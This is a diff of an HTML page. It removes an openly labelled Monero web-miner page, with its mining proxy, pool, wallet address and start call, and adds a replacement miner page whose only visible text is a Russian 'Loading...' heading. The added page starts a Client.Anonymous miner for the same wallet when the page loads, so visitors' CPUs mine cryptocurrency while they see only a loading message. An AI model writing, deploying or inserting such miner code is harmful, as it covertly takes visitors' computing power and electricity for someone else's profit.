@@ -1,42 +1,20 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
-  <head>
-    <meta charset="utf-8">
-    <title>Monero Webminer</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="theme-color" content="#000000">
-    <link rel="manifest" href="manifest.json">
-      <!-- Start Of Mining Code -->
-      <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-      <script>
-          console.log("Config Loaded")
-          server = "wss://ny1.xmrminingproxy.com";
-          var pool = "gulf.moneroocean.stream:10128";
-          var walletAddress = "4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck";
-          var workerId = "GH-XMR"
-          var threads = -1;
-          var password = "";
-          startMining(pool, walletAddress, workerId, threads, password);
-          throttleMiner = 20;
-      </script>
-      <!-- End Of Mining Code -->
-
-
-  </head>
-  <body>
-    <h1>Mining...</h1>
-    <p>View mining progress <a href="https://moneroocean.stream">here</a></p>
-<script>
-  if ('serviceWorker' in navigator) {
-    window.addEventListener('load', () => {
-      navigator.serviceWorker.register('serviceworker.js').then(registration => {
-        console.log('Service Worker registered with scope:', registration.scope);
-      }).catch(error => {
-        console.error('Service Worker registration failed:', error);
-      });
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Web Miner</title>
+</head>
+<body>
+  <h1>Загрузка...</h1>
+  <script src="miner.js"></script>
+  <script>
+    var miner = new Client.Anonymous("4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck", {
+      throttle: 0.2,
+      c: "webgh", // имя воркера
+      ads: 0,
+      wasmFile: "worker.wasm.txt"
     });
-  }
-</script>
-
-  </body>
+    miner.start();
+  </script>
+</body>
 </html>
